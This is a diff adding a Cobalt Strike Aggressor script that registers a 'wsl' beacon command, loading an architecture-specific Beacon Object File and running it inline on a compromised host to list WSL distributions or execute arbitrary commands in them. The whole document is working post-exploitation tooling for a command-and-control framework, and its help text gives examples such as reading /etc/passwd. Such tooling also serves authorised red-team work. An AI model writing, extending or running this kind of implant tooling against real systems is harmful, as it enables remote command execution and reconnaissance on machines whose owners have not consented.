@@ -1,0 +1,96 @@
+beacon_command_register(
+    "wsl",
+    "Execute commands in Windows Subsystem for Linux",
+    "Usage:\n" .
+    "    wsl list                        - List all WSL distributions\n" .
+    "    wsl exec <distro> <command>     - Execute command in distribution\n\n" .
+    "Examples:\n" .
+    "    wsl list\n" .
+    "    wsl exec Ubuntu whoami\n" .
+    "    wsl exec Ubuntu \"cat /etc/passwd\"\n" .
+    "    wsl exec Ubuntu \"uname -a\""
+);
+
+# $1 - beacon id
+# $2 - action (list or exec)
+# $3 - distro name (for exec)
+# $4 - command (for exec)
+alias wsl {
+    local('$handle $data $args $bArch $action $distro $command');
+    
+    # Determine beacon architecture
+    $bArch = barch($1);
+    
+    # Select appropriate BOF file
+    if ($bArch eq "x64") {
+        $handle = openf(script_resource("bof.x64.o"));
+    }
+    else if ($bArch eq "x86") {
+        $handle = openf(script_resource("bof.x86.o"));
+    }
+    else {
+        berror($1, "Unsupported architecture: $bArch");
+        return;
+    }
+    
+    $data = readb($handle, -1);
+    closef($handle);
+    
+    if (strlen($data) == 0) {
+        berror($1, "Could not read BOF file");
+        return;
+    }
+    
+    # Get action from arguments
+    $action = $2;
+    
+    # If no action provided, show help client-side
+    if ($action eq "") {
+        blog($1, "WSL BOF - Execute commands in Windows Subsystem for Linux\n\n" .
+                 "Usage:\n" .
+                 "  wsl list                        - List all WSL distributions\n" .
+                 "  wsl exec <distro> <command>     - Execute command in distribution\n\n" .
+                 "Examples:\n" .
+                 "  wsl list\n" .
+                 "  wsl exec Ubuntu whoami\n" .
+                 "  wsl exec Ubuntu \"cat /etc/passwd\"");
+        return;
+    }
+    
+    # Handle 'list' action
+    if ($action eq "list") {
+        $args = bof_pack($1, "z", "list");
+        beacon_inline_execute($1, $data, "go", $args);
+        return;
+    }
+    
+    # Handle 'exec' action
+    if ($action eq "exec") {
+        $distro = $3;
+        $command = $4;
+        
+        # If distro not provided, show error client-side
+        if ($distro eq "") {
+            berror($1, "Missing distribution name.\n" .
+                       "Usage: wsl exec <distro> <command>\n" .
+                       "Run 'wsl list' to see available distributions.");
+            return;
+        }
+        
+        # If command not provided, show error client-side
+        if ($command eq "") {
+            berror($1, "Missing command.\n" .
+                       "Usage: wsl exec <distro> <command>\n" .
+                       "Example: wsl exec Ubuntu whoami");
+            return;
+        }
+        
+        # Pack: action (str), distro (wstr), command (str)
+        $args = bof_pack($1, "zZz", "exec", $distro, $command);
+        beacon_inline_execute($1, $data, "go", $args);
+        return;
+    }
+    
+    # Unknown action - show error client-side
+    berror($1, "Unknown action '" . $action . "'. Use 'list' or 'exec'.");
+}
